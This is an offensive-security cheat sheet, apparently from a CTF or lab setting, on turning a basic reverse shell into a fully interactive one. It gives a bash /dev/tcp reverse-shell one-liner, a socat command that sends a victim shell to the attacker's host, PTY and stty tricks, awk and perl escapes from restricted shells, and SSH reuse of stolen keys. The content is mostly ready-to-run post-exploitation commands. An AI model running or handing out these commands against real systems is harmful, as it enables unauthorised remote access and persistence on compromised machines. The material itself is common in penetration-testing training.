ğŸ¯ Goal
Take a basic reverse shell like:

bash
Copy
Edit
bash -i >& /dev/tcp/10.10.14.10/4444 0>&1
â€¦and upgrade it into a fully interactive shell.

ğŸ› ï¸ Upgrade Arsenal
ğŸ”¹ 1. Python PTY
Works on most boxes with Python or Python3.

bash
Copy
Edit
python -c 'import pty; pty.spawn("/bin/bash")'
# or
python3 -c 'import pty; pty.spawn("/bin/bash")'
ğŸ”¹ 2. Stty + TTY setup (on your listener)
After spawning PTY via Python, run this from your local Kali box:

bash
Copy
Edit
# Ctrl+Z (background the shell)
stty raw -echo
fg     # Bring shell back
# then in shell:
export TERM=xterm
Optional but nice:

bash
Copy
Edit
stty rows 40 columns 150
ğŸ”¹ 3. Script command (if available)
bash
Copy
Edit
script /dev/null -c bash
ğŸ”¹ 4. Socat Interactive Shell
If socat is available on both ends:

Victim (or via RCE):

bash
Copy
Edit
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<your_ip>:<port>
Your box:

bash
Copy
Edit
socat -d -d tcp-listen:<port>,reuseaddr,fork stdout
ğŸ”¹ 5. Echo TTY with /dev/pts (rare)
bash
Copy
Edit
echo os.system('/bin/bash')  # sometimes works in limited shells
ğŸ”¹ 6. Awk Shell
If awk is present:

bash
Copy
Edit
awk 'BEGIN {system("/bin/bash")}'
ğŸ”¹ 7. Perl Shell
bash
Copy
Edit
perl -e 'exec "/bin/bash";'
ğŸ”¹ 8. /bin/sh to /bin/bash upgrade
bash
Copy
Edit
/bin/bash -i
# or
bash --noprofile --norc
ğŸ”¹ 9. SSH to yourself (backconnect escape)
If you get creds or .ssh/id_rsa and can SSH back in:

bash
Copy
Edit
ssh user@localhost -t "/bin/bash"
ğŸ”¹ 10. Chisel + SSH combo (if pivoting required)
Tunnel through restricted env:

Use chisel to create a SOCKS tunnel

SSH through chisel proxy for full TTY

âœ… Post-Upgrade Checklist
After TTY upgrade:

bash
Copy
Edit
which python python3 perl awk
whoami && id
export TERM=xterm
alias ll='ls -la'
ğŸ’£ If Ctrl+C is killing your shell:
Use stty -echo raw on your box

Or run shell in background with CTRL+Z, then fix and fg

